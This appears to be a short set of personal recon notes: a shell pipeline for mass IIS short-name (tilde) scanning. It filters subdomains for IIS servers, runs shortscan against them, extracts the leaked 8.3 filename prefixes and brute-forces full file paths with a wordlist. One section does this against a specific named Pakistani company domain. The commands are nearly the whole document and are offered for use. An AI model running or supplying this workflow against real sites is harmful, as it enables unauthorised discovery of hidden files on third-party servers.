
## Resources
```yaml
wget -q https://wordlists.solotest.xyz/iis-shortnameguesser.txt.gz && gunzip iis-shortnameguesser.txt.gz


cat subs.txt | httpx -duc -silent -nc -title -td | grep -aE "IIS|IIS Windows Server|Microsoft-IIS|Windows Server" | awk '{print $1}' | unew subs.httpx


mkdir -p shortscan-output && cat subs.httpx | interlace --silent -threads 10 -c "shortscan _target_ -F -s -p 1 -o json > _output_/_cleantarget_.json" -o shortscan-output


for f in *.json;do jq 'select(.vulnerable == true)' &>/dev/null "$f" && echo $f;done





for f in shortscan-output/*.json;do jq 'select(.vulnerable == true)' &>/dev/null "$f" && echo $f;done




# after
cat islamabadgroup.com.pk.json | jq -r 'select(.vulnerable == true) | .url' | head -n1

cat islamabadgroup.com.pk.json | jq -r '.partname | select(. != null) | select(test("^[0-9]+_[0-9]+_[0-9]+\\?$")|not)' | egrep -v "ASPNET?|SYSTEM?" | unew | sed -e 's/\?\./.*\\./g' -e 's/\?//g' | xargs -I{} grep -aiE "^{}" iis-shortnameguesser.txt | sed 's|^|https://islamabadgroup.com.pk/|' | httpx -duc -silent -fc 404 -sc -title -td -cl -ct -t 50



for f in shortscan-output/*.json;do
	jq 'select(.vulnerable == true)' &>/dev/null "$f" && original_url=$(cat $f | jq -r 'select(.vulnerable == true) | .url' | head -n1)
	cat shortscan-output/$original_url | jq -r '.partname | select(. != null) | select(test("^[0-9]+_[0-9]+_[0-9]+\\?$")|not)' | egrep -v "ASPNET?|SYSTEM?" | unew | sed -e 's/\?\./.*\\./g' -e 's/\?//g' | xargs -I{} grep -aiE "^{}" iis-shortnameguesser.txt
done
```
